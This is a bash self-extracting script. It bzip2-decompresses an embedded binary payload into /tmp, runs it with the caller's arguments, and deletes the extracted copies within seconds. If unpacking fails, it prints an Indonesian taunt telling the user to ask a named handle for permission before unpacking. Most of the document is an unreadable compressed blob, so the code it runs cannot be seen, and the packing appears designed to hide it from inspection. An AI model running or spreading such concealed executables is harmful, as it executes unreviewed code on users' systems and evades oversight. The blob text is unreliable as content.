#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYHu: V��e����?�������@D@  P�yn����tt�	H�<I��4�&�G�4�CM�i����&���)��M�   �   ��F���1��� i�  � IEOePh  ����� h4�= �D&#A����6�i�d��COF���!������IO���iZ �Ŝ�9
a=5(,�L��hQ�=#@��<�9+n�L��H����ҁɣL �][t��Z}�lF���&TF,@P·�{�djP�ť�W�o�a2y�Xcy����=d�*)�����bFNA��=C�lC-��xo�ξ�.��`�2!xy�냶�*�#E�s�V?�j�O5� � �>��@�1�1ae�3�[�v�w�Mx�TIuv�)IZ&���4B��.}�`)�Y��'G[ш�H@��('&P���"3�(<�*���q`��=8:PS�K���1���NKZ�c�exz��]b.x�")}�B	q@s	Kr�:u*:�]D�B��涙�z*o�\�Thκ�0Hw�'��;����H� � �Wq{���1"��%?cj�#�`���;��aC�_�͒I6֪I;K���|�*<���B���H��KR�Y�AD�{�Ap$@M�؛ �p�n��$.Jɞ����OKihy�>!5�P���Yrr�?t��	���O%���UM�#g���XM��A���iw�v6��m׎���krߎ#�Z�	��-����ϠŻ�3I��7��u�լ�*`�D��@vlUJ)�2�p��(�V� Nrdr�g� $�EP��	���l肑'������+������V���Z����4{C�)�c��e~���"�҈��X�lp}�Y������}��ev�nf:�D���L`&,Hx���*�^�4A$*\w3�.J��0d�"���H��$E~��"��{�X�8@gc�y�İ<p�Z�@��$a��Y�i��)�|�.{�T]�gLiy�B�E�g�j��=#����I�=��V��5�
 ���mCJX�՚P�iX-Jf��9l�k����t�B�D��&f%�z ��!��8?�CIc�y����p�=Q��*�҉]L��QI�%�Q��ڂ���3���2�e[b��f�c/dO.Q�2t�Ɔ��o���҅�Z��B��}
���n�̰�lJ�2T�<z�>�g,���3Q�j��$-P}me!U��T$V$���(c�,��!bGlte莫G���x���-j����*��ގ�� ����9`ED��X�)C4`�K ��w��U
��p5E"҂��R�,T�� -��T��S�.�p� ��t